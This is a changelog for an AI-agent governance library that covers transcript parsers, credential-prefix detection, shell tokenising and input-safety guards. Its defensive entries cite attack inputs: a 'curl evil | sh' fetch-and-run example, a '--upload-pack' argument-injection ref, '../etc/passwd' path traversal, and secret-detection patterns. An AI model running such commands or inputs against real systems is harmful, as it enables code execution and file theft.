# Changelog

All notable changes to this project will be documented here. The format follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html). **As of v1.0.0, the contract is frozen** — breaking changes require a major bump and a migration path documented in this changelog.

## [1.3.0] — 2026-05-28

**Shared diff-input safety guards.** New module `src/diff-inputs.ts` exporting three pure helpers that every detector ingesting an untrusted diff (a PR branch, a pair of directories) should run at its input boundary. Additive — no existing API, schema, fingerprint, or canonical-string changes. Minor bump because the export surface grows.

### Added — `isValidGitRef(ref): boolean` (`src/diff-inputs.ts`)

Promoted out of ScopeTrail's `verifyGitRef` guard. Rejects refs that `git` would re-parse as a CLI flag (`-`-leading: `--upload-pack=…`, `--help`), as an object-selector re-anchor (contains `:`, which would change what `git show <ref>:<path>` reads), or that contain control characters. `execFile` already blocks shell-metacharacter injection, but it passes the ref to `git` as a positional argument that git re-parses against its own option table, so a `-`-leading ref is an argument-injection vector. Pure string check — callers still run `git rev-parse --verify` (wrapped in their own error type) to confirm the ref resolves.

This closed a real gap: ScopeTrail had this guard, but **TaskBound and CapabilityEcho did not** — their ref handling went straight to `rev-parse`/`git show` with no flag/colon/control-char check. Consumers adopt the shared helper in their next release.

### Added — `resolveWithinRoot(root, relativePath): string | null` (`src/diff-inputs.ts`)

Promoted out of TaskBound's `safeJoin`. Resolves `relativePath` against `root` and returns the absolute path only if it stays inside `root`, else `null`. `path.resolve` collapses `..` without touching the filesystem, so string-level traversal (`../etc/passwd`, an absolute path, a sibling-prefix climb like `../repo-secrets`) is caught before any `readFile`. Symlinks resolve at read time, not by `resolve`, so callers must *also* skip symlinked directory entries during the walk — this guard only stops string traversal.

### Added — `withinByteCap(byteLength, cap?): boolean` + `DEFAULT_MAX_INPUT_BYTES` (`src/diff-inputs.ts`)

Pure size-cap predicate so detectors can `stat` a file (or measure a buffer) and skip oversized inputs without each hard-coding its own limit. Default ceiling is 10 MiB, matching the per-file `maxBuffer` the suite already uses for `git show`/`git diff` output, so adopting it does not change behavior on real source trees. Fails closed (returns `false`) on non-finite or negative sizes.

### Tests

`test/diff-inputs.test.mjs` — 13 cases covering ordinary refs, flag/colon/control-char rejection, the trailing-space case the guard deliberately does *not* police, path containment (traversal, absolute, sibling-prefix), and the byte cap (default, custom, fail-closed).

## [1.2.1] — 2026-05-25

**Two quality patches from the v1.1.1 external inspection round.** Patch release — no API changes, no schema changes, no fingerprint or canonical-string changes. Two memory- and precision-related improvements queued in the v1.1.1 report and held back from v1.2.0 (which was reserved for the Antigravity runtime).

### Changed — `parseFile` streams instead of buffering (`src/parsers/parse-transcript-dir.ts`)

Pre-fix, `parseFile` read the entire transcript into a single string with `readFile(path, 'utf8')` and then `raw.split(/\r?\n/)` into an array of every line. For a 200 MB accumulated session history that's a 200 MB raw string plus an array of tens of thousands of line strings held simultaneously, producing GC spikes proportional to file size.

- Swapped to `createReadStream(path)` piped through `readline.createInterface({ crlfDelay: Infinity })` and iterated with `for await (...)`. Each line is processed and released as we go; memory profile is now bounded by the longest single line rather than file size.
- `crlfDelay: Infinity` collapses `\r\n` line endings on Windows-emitted transcripts so we don't emit empty interleaved lines.
- Three new tests pin the behaviour: CRLF line endings parse identically to LF, a file without a trailing newline still yields its last event, and a 5000-line transcript parses to 5000 events.

### Fixed — boundary anchors on credential prefixes (`src/secrets.ts`)

Pre-fix, each provider regex (`AIza…`, `AKIA…`, `sk-ant-…`, `ghp_…`, etc.) was an unanchored substring match. A long compound identifier that happened to contain a provider prefix mid-token — `mycommit_AIzaSyDdI0…`, `xyzAKIAIOSFODNN7EXAMPLE` — would false-positive as that provider. Reported in the v1.1.1 inspection as a class of false positives on long base64 transactions.

- Each provider regex is now gated by `(?:^|[^A-Za-z0-9_-])` so the prefix only matches at the start of the input or after a non-identifier character. Whitespace, quotes, colon, equals, and other separators still resolve as boundaries — `Bearer AIza…`, `"AKIA…"`, `Authorization: sk-ant-…`, `TOKEN=ghp_…` all still match cleanly.
- The hex-token pattern carried its own boundary anchors from v0.7.0 and is unchanged.
- Two new tests pin the behaviour: prefix-mid-token shapes are NOT flagged across four providers (Google, AWS, Anthropic, GitHub); prefix-at-boundary shapes still ARE flagged across the same four.

### Why a patch (1.2.0 → 1.2.1)

The v1.0.0 contract surface is unchanged. The streaming swap has no observable behavior change on legitimate inputs — same events, same order, same skip counts. The boundary-anchor change narrows what matches: strings that previously matched but where the prefix was buried inside a longer identifier no longer match. This is a precision fix, not a contract change — consumers that were relying on the broader matching were carrying a latent false-positive, not a documented behavior.

### Tests

276 (was 271). Five new — three in `test/parsers.test.mjs` (CRLF, no-trailing-newline, 5k-line streaming smoke), two in `test/secrets.test.mjs` (prefix-mid-token negatives across 4 providers, prefix-at-boundary positives across the same 4).

## [1.2.0] — 2026-05-25

**Native Antigravity stateless parser integration.** Additive minor bump — no breaking changes on the existing v1.1.0 / v1.0.0 contract surfaces. Adds native line-by-line parsing support for Google DeepMind's Antigravity transcript logs.

### Added

- **`parsers/antigravity.ts`** — a sequential stateless parser for Antigravity transcript lines. Supports `USER_INPUT` (unwrapping `<USER_REQUEST>` blocks), `PLANNER_RESPONSE` (emitting tool calls and assistant messages conditionally to prevent empty placeholders), and `MODEL` execution results (linking tool calls and results sequentially via a caller-supplied map).
- **`CommandLine` -> `command` Normalization** — automatically maps Antigravity's `CommandLine` parameter to standard `command` inside `toolInput` so downstream verifiers function with zero modifications.
- **`Cwd` / `DirectoryPath` / `SearchPath` extraction** — extracts the active working directory to the event level for robust relative path analysis and drift detection.
- **Verified Exit Code Extraction** — anchors on `exit code:\s*(-?\d+)` from verified log execution blocks to cleanly capture tests and build outputs.

### Changed

- **`transcript-events.ts`** — registered `'antigravity'` in the standard `Runtime` union type.
- **`parsers/index.ts`** — exported `isAntigravityLine` and `parseAntigravityLine` publicly from the package entry point.
- **`parse-transcript-dir.ts`** — integrated the Antigravity dispatch routing in the core Walk loop.

### Tests

- 6 new dedicated unit tests inside `test/antigravity.test.mjs` ensuring 100% code coverage across all parsing, unwrap, exit code extraction, and defensive fallback scenarios.

## [1.1.1] — 2026-05-24

**Stack-exhaustion hardening on two parsers.** Patch release — same v1.0.0 contract surface, no API changes, no behaviour changes on legitimate inputs. Two adversarial-input edge cases that could blow the JS stack are now bounded.

### Fixed — `getCommandHead` recursive wrapper-stripping (`src/shell.ts`)

Pre-fix, the wrapper-stripping logic in `getCommandHead` recursed on every match (`sudo curl` → `getCommandHead('curl')`). V8 does not reliably tail-call optimize, so a pathological input like `'sudo '.repeat(20000) + 'curl …'` threw a RangeError mid-scan instead of producing a result. CapabilityEcho and any other consumer feeding it untrusted bash text would crash on adversarially-crafted commands.

- Rewrote as an iterative loop with a 64-iteration cap. The cap is well above any plausible legitimate wrapper chain (`sudo nohup env exec command …` would be ~6 deep) while bounding worst-case time and stack depth.
- Two new tests pin the behaviour: a 20k-deep wrapper chain returns a string in bounded time without throwing, and plausible short chains (`sudo curl`, `sudo -E env FOO=1 curl`, `nohup sudo env -i exec curl`) still resolve to the real command head exactly as before.

### Fixed — `parseToml` mutually-recursive nesting (`src/toml.ts`)

The TOML parser's `parseValue` mutually recursed with `parseArray` and `parseInlineTable`, all sharing one JS call stack with no depth bound. A crafted input like `a = { a = { a = … } }` ~2000 levels deep, or the equivalent array form, would blow the stack with a generic RangeError instead of a parser-shaped diagnostic.

- Added a `nestingDepth` counter to `TomlParser`, incremented on entry to value/array/inline-table parsing and decremented on exit. Throws a clean `'TOML nesting too deep'` error (with the same `ConfigParseError` shape downstream consumers already handle) when the configured cap is exceeded.
- Three new tests pin the behaviour: pathological inline-table nesting and pathological array nesting both throw the clean error; legitimate-but-deep configs (50 levels, well above any real-world TOML) still parse fine.

### Why a patch (1.1.0 → 1.1.1)

The v1.0.0 contract surface is unchanged. Every existing test still passes (260 → 265, five new added for the regressions above). The only observable behaviour change is on inputs that previously threw RangeError mid-scan — those now either return successfully (`getCommandHead`) or throw a structured `'TOML nesting too deep'` error instead of an unstructured RangeError. Neither case can break a consumer that wasn't already broken.

### Tests

265 (was 260). Five new — two in `test/shell.test.mjs` (pathological wrapper + plausible-short-chains sanity), three in `test/toml.test.mjs` (pathological inline-table, pathological array, plausible-50-deep sanity).

## [1.1.0] — 2026-05-23

**Transcript-event types + JSONL parsers.** Additive on top of v1.0.0 — no existing surface changes, no breaking moves.

### Added

The substrate now hosts the parser surface that AgentPulse v0.1–v0.4 and SessionTrail had each been vendoring separately. One source of truth, downstream tools stop drifting out of sync.

- **`TranscriptEvent`** + **`EventKind`** + **`Runtime`** + **`ParseOptions`** types — the canonical shape for any normalized event read off a Claude Code, Cursor, or Codex JSONL transcript. Live in `src/transcript-events.ts`.
- **`parseTranscriptDir(transcriptDir, opts?)`** — top-level entry point. Walks a directory recursively, picks up `.jsonl` files, parses each line, interpolates missing timestamps, filters by `since` / `until` if supplied, returns a chronologically sorted `TranscriptEvent[]`. Malformed lines are counted and reported via a single aggregate `console.warn` (suppressible with `opts.silent: true` for TUI consumers).
- **Per-runtime parsers** for callers that already hold a parsed line:
  - `parseAnthropicLine(parsed, forcedRuntime?)` — Claude Code / Cursor envelope, handles `tool_use` + `tool_result` blocks, exit-code extraction
  - `parseCodexLine(parsed)` — Codex `response_item` + `session_meta`, handles `function_call` / `function_call_output` / `local_shell_call_output` / `message` payloads, `apply_patch` non-JSON args
  - `detectAnthropicRuntime(line)` — distinguishes Claude Code from Cursor based on top-level shape (`sessionId`, `cwd`, `version`, `source`)
  - `isCodexLine(parsed)` + `isCodexSessionMeta(parsed)` — type guards used during the line-by-line routing in `parseTranscriptDir`
- **Shared helpers**: `coerceTimestamp`, `extractExitCode`, `extractTextFromBlocks`, `extractToolResultText`, `interpolateTimestamps`, `isRecord` — all stable, all exported.

### Architecture

- New files: `src/transcript-events.ts` (types), `src/parsers/util.ts`, `src/parsers/claude-code.ts`, `src/parsers/codex.ts`, `src/parsers/parse-transcript-dir.ts`, `src/parsers/index.ts` (barrel).
- `src/index.ts` gained one new `export type {}` block + one new `export {}` block. No existing exports moved, renamed, or changed.
- Aggregate warning message changed from AgentPulse's `[agentpulse:parser]` prefix to `[transcript-parser]` — brand-neutral, since multiple tools now share the surface.

### Tests

265 (was 259). Six new tests in `test/parsers.test.mjs` covering:
- Claude Code roundtrip (user / tool_use / tool_result chain with exit-code extraction)
- Cursor (missing timestamps tolerated, interpolation safely no-ops)
- Codex (`response_item` shapes, `session_meta` emits system event, `apply_patch` falls back to `.patch`, JSON `shell` args parsed normally)
- `since` / `until` window filtering drops timestamp-0 events when a window is supplied
- Malformed lines are skipped without throwing; surrounding good lines still parse
- Subdirectory walk merges results chronologically across runtimes

Fixture files (`fixtures-parsers-claude-code.jsonl`, `fixtures-parsers-codex.jsonl`, `fixtures-parsers-cursor.jsonl`) live alongside the test files following the flat-layout convention used by the rest of the suite.

### Migration for downstream tools

- **AgentPulse v0.5+** will import the surface from agent-gov-core; the local `src/parser.ts` + `src/parsers/` shrink to a thin re-export and eventually delete.
- **SessionTrail v1.0+** can adopt the same way — drop its vendored `src/transcript.ts` body, re-export from `agent-gov-core`, ship.
- **New consumers** should import `parseTranscriptDir` + `TranscriptEvent` from `agent-gov-core` directly.

The v1.0.0 contract surface stays exactly as documented — every existing export, schema, and hash format is unchanged.

## [1.0.0] — 2026-05-23

**Semver freeze.** No source changes vs. v0.8.1 — this release marks the contract as stable. Everything pinned by the golden tests (`fingerprintFinding` hash shape, `normalizeMcpCommand` canonical string format, the `Finding`, `Report`, and `MergedReport` schemas) is now under semver: breaking changes will require a 2.0.0.

### What's stable as of v1.0.0
- `Finding` schema + `kind` namespace pattern (`<tool>.<slug>`)
- `Report` envelope (schemaVersion `'1.0'`, `tool`/`rating`/`findings`/optional `conversationId`/`baseRef`/`headRef`/`data`)
- `MergedReport` envelope from `mergeFindings` (adds `sources[]`, `workflowName?`, `invalidReports[]`, `invalidFindings[]`)
- `fingerprintFinding` hash format: 16-char hex of `(kind, file, line, column, salientKey?)` with backslash → forward-slash path normalization
- `normalizeMcpCommand` canonical string format: JSON-encoded args, JSON-encoded sorted env pairs, known-runtime basename collapse, Windows-shape case folding
- All other public exports: `createFinding`, `createReport`, `validateFinding`, `validateReport`, `validateMergedReport`, `mergeFindings`, `applyExceptions`, `matchSecret`, `tokenizeShell`, `tokenizeShellDeep`, `getCommandHead`, `lineOfJsonKey`, `lineOfJsonStringValue`, `lineOfTomlKey`, `readJsonObjectWithSource`, `readTomlObject`, `parseToml`, `emitFindingAnnotation`, `generateWorkflowSummary`, `rankSeverity`, `passesSeverityThreshold`, `anyAtOrAbove`, `ConfigParseError`, `lineColumnOfOffset`
- All schemas under `./schemas/` (`finding.schema.json`, `report.schema.json`)

### Validation
- All 254 tests pass on v0.8.1 source, including 11 golden compatibility tests pinning the contract surface.
- Five consumer tools (ScopeTrail, PolicyMesh, CapabilityEcho, TaskBound, SessionTrail) and GovVerdict have now adopted `createReport` + `createFinding` as their exclusive output path. End-to-end smoke: GovVerdict merges five canonical reports → 42 unique findings, cross-tool dedup working, rating critical.

### Stability guarantees post-v1.0
- Adding new optional fields, exports, or detectors → minor bump (`1.1.0`).
- Changing the shape of `fingerprintFinding` output, the `normalizeMcpCommand` canonical string, or any schema's `additionalProperties: false` boundary → major bump (`2.0.0`) with documented migration.
- Internal refactors (renaming non-exported functions, restructuring `dist/`) → patch (`1.0.1`).

The contract has been hardened across 7 external inspection rounds (Gemini ×3, Cody ×2, Cursor ×2) since v0.4.0; every regression caught was either fixed and pinned by a golden, or documented as out-of-scope in `docs/SECURITY.md`.

## [0.8.1] — 2026-05-22

ReDoS audit patch. Zero source changes — every regex evaluator in `src/secrets.ts`, `src/shell.ts`, `src/locators.ts`, and `src/mcp.ts` was already safe by construction (no nested quantifiers over overlapping character classes; disjoint alternation; anchored where applicable). Ships durable verification + threat-model documentation so future contributors don't have to re-derive the analysis.

### Added
- [`docs/SECURITY.md`](./docs/SECURITY.md) — threat model for regex evaluation on untrusted input, plus what we don't protect against (the `dottedKey` argument to `lineOfTomlKey` is treated as developer-supplied; the SessionTrail-class user-supplied-pattern vector does not apply because the library never accepts a pattern from a caller). Bundled in the published tarball via the existing `files: ["docs"]` entry.
- [`test/redos.test.mjs`](./test/redos.test.mjs) — adversarial harness. 18 tests, each exercising one regex evaluator against ~100 KB of input shaped to trigger the worst backtracking path the pattern could exhibit (long benign, long near-miss, nested-quantifier-style). Each call must complete under a 50 ms wall-clock budget. Current worst case is the `bash -c` payload extractor at <10 ms — three orders of magnitude clear of catastrophic backtracking.

### Tests
- 254 total, up from 236. 18 new ReDoS pinning tests covering every regex evaluator in the four audited files.

## [0.8.0] — 2026-05-22

Anchor release for the cross-tool meta-reviewer. Additive minor bump — one new optional field, one new validator. No breaking changes; all 0.7.x consumers continue to work unchanged.

### Added
- `MergedReport.workflowName` (optional) — populated when `mergeFindings(reports, { workflowName })` is called. Cross-walks to OpenTelemetry's [`gen_ai.workflow.name`](./docs/INTEROP-OTEL.md) semantic convention so a meta-reviewer rolling up N tool reports for one workflow run can carry the same string downstream observability already uses. Never inferred — the meta-reviewer caller owns it.
- `MergeOptions.workflowName?: string` — opts-in entry point for the field above.
- `validateMergedReport(value)` — strict envelope check for `MergedReport`. Mirrors `validateReport` on the source side so a meta-reviewer that round-trips merged output through JSON can verify it the same way.

### Tests
- 236 total, up from 230. 6 new cases: workflowName round-trip, workflowName omission default, validateMergedReport happy path, validateMergedReport structural/rating rejection, validateMergedReport counter/unknown-property rejection, validateMergedReport workflowName type rejection.

## [0.7.1] — 2026-05-22

Contract-hardening patch. Two external inspection rounds (Gemini + Cody) surfaced five P0/P1 contract bugs in shipped code and one packaging fix. All addressed here. No new features; no new public exports.

### Fixed (correctness)

- **`applyExceptions` is now order-independent.** Previously the FIRST matching rule won — a stale expired rule listed before a broader active rule would incorrectly surface the finding as expired instead of being suppressed by the active rule. Now ALL matching rules are collected; the finding is suppressed when any matching rule is active, and only re-surfaces (with downgrade) when every matching rule has expired.
- **`mergeFindings` rejects tool/finding mismatches.** Previously a forged `scope_trail` report containing `policy_mesh.*` findings would merge silently with wrong provenance. `validateReport` already rejected this; the merge path was more permissive. Now mismatches land in `invalidFindings[]` while the rest of the report still passes through.
- **`normalizeMcpCommand` no longer collides on whitespace/delimiter args.** `['a b']` and `['a', 'b']` previously produced the same canonical `args=a b` because of space-joining. Same shape for env: `{A:'1|B=2'}` and `{A:'1', B:'2'}` collided under pipe-joining. Both now use JSON encoding so distinct inputs produce distinct canonicals. **This changes the canonical-string format**; PolicyMesh's `mcp_command_mismatch` will now correctly detect previously-conflated MCP configs.
- **`createReport` clamps a downward-rating override upward to the implied max.** Previously `createReport({rating: 'low', findings: [critical-finding]})` returned a report that `validateReport` would then reject — the constructor and validator disagreed. Now createReport's output always round-trips through validateReport. Upward overrides (rating > implied) are still honored.
- **`applyExceptions` pathPrefix now normalizes Windows backslashes and requires segment boundaries.** A finding with `src\app.ts` (Windows) now matches a `src/` prefix; a prefix `src/app` no longer over-suppresses `src/application.ts` (the match must land on a `/` boundary or be the exact path).

### Changed (visible to consumers)

- **MCP canonical-string format**: `args` and `env` now serialize as JSON. Existing PolicyMesh test fixtures may need updates if they pin the exact canonical (most don't — they pin server-identity-equivalence). Golden tests in `test/golden.test.mjs` updated to the new format.

### Packaging
- `docs/` directory is now included in the npm tarball. The README's link to `docs/INTEROP-OTEL.md` no longer 404s on the npm landing page.

### Cleanup
- `candidateTool` in `merge.ts` now delegates to `isToolKind` from `finding.ts` instead of carrying a hardcoded tool-list regex. Removes the fourth lockstep duplication of the ToolKind enum.

### Tests
- 230 total, up from 220. 10 new regression cases: order-independent exception application, all-expired downgrade chain, Windows-backslash path normalization, segment-aware prefix boundary, mergeFindings tool-mismatch rejection, MCP args whitespace collision, MCP env delimiter collision, MCP env order-independence under JSON encoding, createReport rating clamp, createReport round-trip-validates contract.

### Skipped vs Cursor inspection
- Gemini #3 (secret-pattern boundary anchors): proposed fix didn't actually fix the example given (`my-transaction-id-AIza<35>` has `-` as boundary character, so a boundary anchor still allows the match). Held for further design.
- Gemini #4 (hex token vs `GITHUB_SHA`): operationally rare given current consumer scanning paths; document-only follow-up.
- Cursor's README/package.json description / CONTRIBUTING module list refresh: pending follow-up doc PR.

## [0.7.0] — 2026-05-22

**The pre-v1.0 consolidation release.** Bundles everything that was queued for v0.6.0 (report envelope + merge layer + OTel GenAI interop) plus two universal detectors promoted from consumer repos: `matchSecret` (from PolicyMesh) and `applyExceptions` (unifying PolicyMesh's `subject` and TaskBound's `allow_paths` shapes).

No breaking changes to the v0.5.0 surface — additive minor bump. One npm publish covers all of it.

This is the last release before v1.0 freeze. The remaining gate is consumer-side: at least one tool wiring `generateWorkflowSummary` end-to-end, then v1.0 with semver guarantees on the contract pinned by the golden tests.

### Added — Report envelope
- `Report` interface — canonical multi-tool envelope with `schemaVersion`, `tool`, `rating`, optional `toolVersion`/`runId`/`conversationId`/`baseRef`/`headRef`, `findings: Finding[]`, and tool-specific extension `data`.
- `Report.conversationId` (optional) — agent session / PR review / thread identifier. Matches OpenTelemetry's `gen_ai.conversation.id` semantic convention so a consumer can pass the same string into both governance reports and OTel traces, then correlate them downstream.
- `REPORT_SCHEMA_VERSION` const (`'1.0'`).
- `schemas/report.schema.json` — JSON schema for the envelope, exposed via the package's `./schemas/report.schema.json` export.
- `createReport({tool, findings, ...})` — convenience constructor; sets `schemaVersion` and computes `rating` from max finding severity (unless overridden).
- `maxSeverity(findings)` — helper that returns `'none' | Severity` across a finding list.
- `validateReport(value)` — strict envelope check that also validates each contained finding and flags cross-field inconsistencies (e.g. rating below implied max).

### Added — Merge layer
- `mergeFindings(reports, opts?)` — combine N tool reports into one normalized `MergedReport`:
  - Deduplicates by `Finding.fingerprint`. Default policy: keep highest severity; `duplicatePolicy: 'first'` keeps the first occurrence.
  - Optional severity `threshold` drops findings below the requested level into a counted `droppedBelowThreshold` field.
  - Aggregates rating from the surviving findings, not source ratings — so threshold filtering correctly demotes the merged rating.
  - Sorts findings by severity, highest first.
  - Propagates `conversationId` to the merged report iff every source agrees. Cross-conversation mixing leaves the field intentionally empty so a meta-reviewer can detect misuse.
  - **Never silently drops bad data**: malformed envelopes go to `invalidReports[]`, individual malformed findings go to `invalidFindings[]`. A single bad finding in a tool's report doesn't poison the rest of that report.
- `MergeOptions`, `MergeSource` (with optional `conversationId`), `MergedReport` (with optional `conversationId`), `InvalidReport`, `InvalidFinding` types.

### Added — OpenTelemetry GenAI interop
- `docs/INTEROP-OTEL.md` — explicit cross-walk between `agent-gov-core` types and OTel's [`gen_ai.*` semantic conventions](https://opentelemetry.io/docs/specs/semconv/gen-ai/). Maps `Report.conversationId` ↔ `gen_ai.conversation.id`, documents why we adopt one bridge field and not the whole namespace, and shows a paired-emission pattern for orgs running OTel-instrumented agents alongside governance tools.

### Added — Hardcoded secret detection (promoted from PolicyMesh)
- `matchSecret(value, options?)` — scans a string for provider-prefix credentials and returns `{ provider }` (never the literal credential). Built-in patterns: Anthropic, OpenAI (sk- + sk-proj-), GitHub (PAT + classic), Slack, AWS, Google, GitLab, npm, Docker, Stripe, plus a length-restricted hex token pattern gated to env/header context to avoid commit-SHA false positives.
- `MatchSecretOptions.envOrHeaderContext` — opt-in flag for the hex token pattern.
- `SECRET_PATTERNS` — exported read-only constant table; golden-tested so additions are non-breaking but removals require a major bump.
- `SecretMatch` type.
- `env:VAR` references are never flagged (Codex notation for env-var lookups).

### Added — Exception baselines (promoted + unified from PolicyMesh + TaskBound)
- `applyExceptions(findings, exceptions, now?)` — suppress (or downgrade-on-expiry) findings matched by `kind` + optional `salientKey` + optional `pathPrefix`. PolicyMesh's `.policymesh-exceptions.json` shape and TaskBound's `.taskbound.yml` `ignore_kinds`/`allow_paths` shape both map cleanly onto this unified primitive.
- Expired exceptions don't silently drop — they re-surface with severity downgraded to `'low'` and an `[EXPIRED WHITELIST]` message prefix so stale baselines stay visible. Reason text propagates to `finding.data.exceptionReason`.
- `validateException(value)` — runtime check for well-formed exception entries.
- `Exception`, `ApplyExceptionsResult` types.

### Tests
- 57 new cases. 220 total (up from 163). Breakdown:
  - Report: 17 (schemaVersion pinning, rating derivation, explicit-rating override, validateReport accepting/rejecting envelope-level errors, finding-tool consistency, unknown property rejection, downgrade-allowed/upgrade-flagged rating consistency, conversationId passthrough + type check).
  - Merge: 14 (empty input, cross-tool combine, fingerprint dedup with `highest_severity` and `first` policies, salientKey-disambiguated findings stay separate, threshold filtering, malformed report → invalidReports, malformed finding → invalidFindings, severity-sorted output, aggregate-rating-reflects-survivors, source provenance, conversationId agreement/disagreement/partial-coverage propagation).
  - Secrets: 11 (each provider class detected, env: refs never flagged, empty/short input ignored, hex token gated to env/header context, non-hex 40-char string rejected, never-leak-literal contract, golden-pinned `SECRET_PATTERNS` provider set).
  - Exceptions: 15 (empty input identity, suppress by kind/salientKey/pathPrefix, perpetual-active when no expires, expired surfacing with downgrade/prefix/reason, non-matching kind/salientKey passthrough, pathPrefix without location.file safely non-matches, malformed expires treated as never-expires, future expires stays active, validateException accept/reject paths).

## [0.5.0] — 2026-05-22

Three additive features completing the queue from Gemini's third inspection round, plus five correctness fixes from a deep code-level inspection done before publish. No breaking changes — existing exports and call signatures unchanged.

Minor bump (not patch) because the surface grew: three new top-level exports.

### Fixed (pre-publish inspection sweep — Gemini + Cody)
- `tokenizeShell` no longer splits on `&` inside file-descriptor redirections (`2>&1`, `>&2`, `<&3`). The single-`&` separator rule now checks the preceding non-whitespace character.
- `tokenizeShellDeep` no longer false-positives on `bash -c` text inside double-quoted echo arguments. Previously a whole-string regex matched `bash -c` anywhere, including data being printed. Detection now runs inside the quote-aware walk and only fires at command boundaries outside quoted regions.
- `updateMultilineStringState` (TOML locator) now tracks backslash escapes inside basic multi-line strings (`"""…"""`). An escaped `\"""` inside the value no longer prematurely terminates the string-state walker, which had caused decoy keys to match. Literal strings (`'''…'''`) intentionally don't track escapes per TOML spec.
- `lineOfTomlKey` now finds dotted keys nested under any prefix table — not just at file root. `[a]\nb.c = 42` is now reachable as `a.b.c`. Same shape as the v0.4.4 top-level fix, generalized.
- `lineOfTomlKey` now matches spaced dotted keys (`a . b . c = 1`) which `parseToml` had always accepted but the locator's compact-only regex couldn't find. Pattern now builds from individual segments joined by `\s*\.\s*`.
- TOML parser correctly handles a line-ending backslash followed by trailing inline whitespace before the newline. Per spec, `"""line\   \nnext"""` strips the newline and trims leading whitespace on the next line. Previously the trailing spaces caused the backslash to be treated as a regular escape (which silently kept everything literally rather than throwing, but still wasn't spec-compliant).
- `normalizeMcpCommand` now treats common boolean long-flags (`--verbose`, `--quiet`, `--debug`, `--help`, `--version`, `--force`, `--dry-run`, `--no-cache`, `--no-color`, `--no-progress`, `--json`, plus short forms `-v -V -q -h -d`) as standalone instead of greedily pairing them with the next positional. Configs with `--verbose pkg` no longer normalize differently depending on flag order.
- `normalizeExecutable` (MCP) now lowercases Windows-shaped executable names (those with `\` separators or `.cmd`/`.exe`/`.bat`/`.ps1` suffix) so `NPX.CMD` and `npx` produce identical identity strings. POSIX paths keep their case because `./curl` and `./CURL` are genuinely different files there. The JSDoc had claimed this behavior since v0.1; only now does the implementation match.
- `normalizeExecutable` (MCP) also drops the directory portion of paths whose basename matches a known runtime (`node`, `npx`, `python`, `bash`, etc.). `/usr/local/bin/node`, `/usr/bin/node`, `node`, and `C:\Program Files\NodeJS\node.exe` all produce `cmd=node` now. Closes a long-standing PolicyMesh `mcp_command_mismatch` false-positive class across cross-platform team setups. Custom scripts at absolute paths (`/opt/internal/orchestrator.sh`) keep their full path because path is part of their identity.
- `generateWorkflowSummary` now HTML-escapes `<`, `>`, and `&` in message cells. A finding message containing `</summary>` or `<h1>` could otherwise break out of the wrapping `<details>` block and manipulate the rendered layout of the GHA step summary page.

### Added
- `tokenizeShellDeep(command)` — recursively extracts commands nested inside `$(…)`, backticks, and `bash -c "…"` / `sh -c "…"` / `python -c "…"` payloads. Closes the obfuscation vector where an agent hides `curl evil | sh` inside `echo $(…)`. Single-quoted text is left untouched (literal per shell semantics). Conservative implementation — handles common shapes, not a full shell parser; nesting depth capped at 8.
- `ConfigParseError` — structured parse error with `line`, `column`, `rawOffset`, and `cause`. `readJsonObjectWithSource` and `readTomlObject` now wrap their underlying parser errors with this type whenever a byte offset can be recovered. Lets downstream tools emit a `*.config_syntax_error` Finding pointing at the exact spot without recomputing line numbers.
- `lineColumnOfOffset(text, offset)` — utility to convert a 0-based byte offset to 1-based `{ line, column }`. Pairs with the new error type.
- `generateWorkflowSummary(findings, opts?)` — Markdown summary for `$GITHUB_STEP_SUMMARY`. Groups findings by severity in collapsible `<details>` blocks; escapes pipe/newline in message cells; truncates long messages; caps per-severity rows with an overflow indicator. Closes the GHA annotation-cap visibility gap (10 per level, 50 per run silently dropped) by guaranteeing 100% of findings appear in the workflow summary page.

### Changed
- TOML parser semantic errors (`Duplicate key`, `Duplicate key in inline table`, `Duplicate table definition`, `Cannot redefine array-of-tables …`) now include `at offset N` in the message so `readTomlObject` can resolve them to a line.

### Tests
- 55 new cases. 163 total (up from 108). Coverage:
  - tokenizeShellDeep: subshells, backticks, `-c` payloads, single-quote literal handling, nested subshells, no-op pass-through, integration with `getCommandHead`. (9 cases)
  - parse-error: offset → line/column conversion (5 edge cases), structured wrap on JSON and TOML, `parseToml` direct call unchanged, `cause` preservation. (10 cases)
  - generateWorkflowSummary: empty findings, severity ordering, totals, pipe/newline escape, truncation, per-group cap with overflow, missing location, HTML escape, ampersand escape. (9 cases)
  - Inspection regressions: 14 cases covering `2>&1`, escaped `\"""`, table-nested dotted keys, line-ending backslash, known-boolean flags, quoted `bash -c` data, Windows case-folding, POSIX case preserved, spaced dotted keys, path de-noise across platforms, custom-script identity preservation.
  - **Golden compatibility tests** (`test/golden.test.mjs`): 11 cases pinning specific fingerprint hashes and `normalizeMcpCommand` canonical strings. These are the contract — breaking them requires a major bump and migration plan.

## [0.4.4] — 2026-05-22

Cody-led inspection (third reviewer, third round) caught five issues, two of them P0 regressions I introduced in my own v0.4.2 / v0.4.3 fixes. All five fixed here.

### Fixed
- **P0**: `fingerprintFinding` no longer appends an empty-string segment for findings without `salientKey`. v0.4.3 added `?? ''` which silently changed the hash for every existing finding and broke the v0.4.2 → v0.4.3 backwards-compat claim in my own changelog. Pinned by a new test that asserts the specific v0.4.2-form hash for a salient-less finding.
- **P0**: TOML parser no longer rejects valid subtable headers repeated under separate array-of-tables entries. `[[fruits]] [fruits.physical] [[fruits]] [fruits.physical]` now parses correctly — each `[[fruits]]` entry resets the "already defined" status of subtable paths under that AOT. My v0.4.2 `definedTables` guard was global per-file when it should have been scoped to the current AOT entry.
- `lineOfJsonStringValue` no longer matches occurrences in key position. Searching for value `"command"` in `{"command":"npx", "args":["command"]}` now returns the array-element line, not the key. Negative lookahead `(?!\s*:)` after the closing quote.
- `lineOfTomlKey` now finds top-level dotted keys. `lineOfTomlKey('a.b.c = 1', 'a.b.c')` returns 1 instead of 0 — the dotted-key check was gated behind `inTargetTable` which is false at file root.

### Changed
- `package-lock.json` resynced to 0.4.4. Was drifting at 0.4.2 because previous releases bumped `package.json` without running `npm install` to refresh the lockfile.

### Tests
- 6 new cases: pinned v0.4.2-form fingerprint hash, JSON value-vs-key disambiguation (+ colon-in-value sanity check), top-level dotted TOML keys, AOT subtable repeat across entries (+ within-entry duplicate still rejected). 108 total (up from 102).

## [0.4.3] — 2026-05-22

Third Gemini-inspection round caught one confirmed bug, one disguised-as-suggestion bug, and three feature opportunities. Both bugs fixed here; the feature work is queued for v0.5.0.

### Added
